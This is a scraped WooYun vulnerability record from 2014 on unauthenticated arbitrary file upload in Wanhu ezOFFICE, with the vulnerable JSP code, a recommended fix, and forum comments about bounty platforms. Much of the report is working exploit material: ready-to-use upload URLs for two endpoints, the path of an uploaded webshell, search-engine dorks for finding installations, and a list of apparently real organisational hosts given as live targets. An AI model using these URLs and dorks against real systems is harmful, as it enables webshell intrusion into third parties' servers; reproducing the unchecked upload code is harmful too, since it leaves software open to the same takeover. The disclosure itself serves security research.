{"id": 1586, "wybug_id": "wooyun-2014-063888", "wybug_title": "万户ezOFFICE无限制任意文件上传可getshell（两处）", "wybug_corp": "万户", "wybug_author": "北京方便面", "wybug_date": "2014-06-07 13:53", "wybug_open_date": "2014-09-05 13:54", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "任意", "文件上传安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向公众公开  简要描述： 万户ezOFFICE无限制任意文件上传可getshell 详细说明：  defaultroot/public/jsp/singleupload.jsp\n<%  String path=request.getParameter(\"path\");  String del=request.getParameter(\"del\");  String hiddenName=request.getParameter(\"hiddenName\");  String visualName=request.getParameter(\"visualName\");  String filePath=\"//upload//\"+path+\"//\";  String mode=request.getParameter(\"mode\");  if(mode==null) mode=\"normal\";  if(\"yes\".equals(del)){\t  //删除原来的附件  }  if(mode.equals(\"add\")){\t  String fileName=\"\";\t  String saveName=\"\";\t  myUpload.initialize(pageContext);\t  myUpload.upload();\t  for (int j=0;j<myUpload.getFiles().getCount();j++){\t\t  String myRandom=new com.whir.common.util.Random().getRandom();\t\t  com.jspsmart.upload.File myFile = myUpload.getFiles().getFile(j);\t\t  if (!myFile.isMissing()) {\t\t\t  saveName=myRandom+\".\"+myFile.getFileExt();\t\t\t  fileName=myFile.getFileName();\t\t\t  myFile.saveAs(filePath + saveName);\t\t  }\t  }\t  %>\t  <SCRIPT LANGUAGE=\"JavaScript\">\t\t  <!--\t\t  alert(\"附件上传成功！\");\t\t  opener.document.all.<%=visualName%>.value = \"<%=fileName%>\";\t\t  opener.document.all.<%=hiddenName%>.value = \"<%=saveName%>\";\t\t  window.close();\t\t  //-->\n没有验证权限及文件类型，可上传任意文件http://hljxwjtheb.vicp.cc:7001/defaultroot/public/jsp/singleupload.jsp?path=desktop&visualName=unitImgName&hiddenName=unitImgSaveName&del=yes上传后路径为：defaultroot\\upload\\desktop\\2014060713212253164872746.jsphttp://hljxwjtheb.vicp.cc:7001/defaultroot/upload/desktop/2014060713212253164872746.jsp?z0=utf-8当然 这里我们也可以控制上传路径 path=desktop百度关键词http://www.baidu.com/s?cl=3&wd=Wanhu+ezOFFICEhttp://74.125.227.77/#newwindow=1&q=Wanhu+ezOFFICE&start=20第二处：http://hljxwjtheb.vicp.cc:7001/defaultroot/public/jsp/smartUpload.jsp?path=innerMailbox&fileName=innerMailFileName&saveName=innerMailSaveName&tableName=innerMaildisplaytable&fileMaxSize=0&fileMaxNum=0&fileType=&fileMinHeight=0&fileMinWidth=0&fileMaxHeight=0&fileMaxWidth=0   漏洞证明：  实例：http://oa.akcq.com/defaultroot/public/jsp/singleupload.jsp?path=desktop&visualName=unitImgName&hiddenName=unitImgSaveName&del=yeshttp://oa.ctcai.com:7001/defaultroot/public/jsp/singleupload.jsp?path=desktop&visualName=unitImgName&hiddenName=unitImgSaveName&del=yeshttp://oa.polyfilm.net:7001/defaultroot/public/jsp/singleupload.jsp?path=desktop&visualName=unitImgName&hiddenName=unitImgSaveName&del=yeshttp://myoho.net:7001/defaultroot/public/jsp/singleupload.jsp?path=desktop&visualName=unitImgName&hiddenName=unitImgSaveName&del=yeshttp://oa.china-sss.com/defaultroot/public/jsp/singleupload.jsp?path=desktop&visualName=unitImgName&hiddenName=unitImgSaveName&del=yes\n\n\n\n\n\n   修复方案：  添加权限验证及过滤文件类型   版权声明：转载请注明来源 北京方便面@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-06-11 16:42 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-07 14:06 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  无奈，剽窃360的    \n     2014-06-07 14:13 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  漏洞有重复ID：http://loudong.360.cn/vul/info/id/7175    \n     2014-06-07 14:20 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @U神 没有看到细节之前这么说是不妥的。    \n     2014-06-07 14:22 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @梧桐雨 我觉得360和乌云最大的区别是：一个漏洞，你如果发360去，剽窃到提交乌云可以获取奖金，乌云首发，剽窃提交到360，360拒绝付款    \n     2014-06-07 14:25 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @U神 这也是公开和封闭最大的区别了。    \n     2014-06-07 14:53 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我信洞主    \n     2014-06-07 14:54 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  @U神 公司之间模仿的本质区别   以及所谓帽子之间人品 金钱的本质区别我只送三个字  呵呵呵    \n     2014-06-07 15:06 |    \t\t北京方便面  \t\t\t( 核心白帽子 |\t\t\t        Rank:876 漏洞数:66        | 我爱吃北京方便面)\t\t \n  不能骂人 呵呵    \n     2014-06-07 15:13 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  信洞主。    \n     2014-06-07 15:14 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @xsser 其实本来我想也发乌云，但是呢？看到奖金迟迟都没有打来，所以....    \n     2014-06-07 16:28 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  钱、权、性皆抛弃方能成为顶尖世界大牛~    \n     2014-06-07 19:08 |    \t\t么么哒 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 么么哒)\t\t \n  @U神 360这个洞给了你多少让你放弃了我大wooyun    \n     2014-06-07 19:34 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @U神 这话没意思了    \n     2014-06-07 19:40 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @xsser 360给了2200，剑心的估价是？    \n     2014-06-07 20:02 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @U神 http://www.wooyun.org/prize 这不是个生意    \n     2014-06-07 20:56 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @U神 @xsser 现在我的角度看，我还是希望发在乌云，让我这种菜鸟涨涨姿态……另外剑心，厂商说漏洞认领不了，都@你好几次了    \n     2014-06-07 23:30 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @Mosuan 漏洞ID发我    \n     2014-06-07 23:44 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @Finger 已私信    \n     2014-07-02 10:42 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这货太多漏洞了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}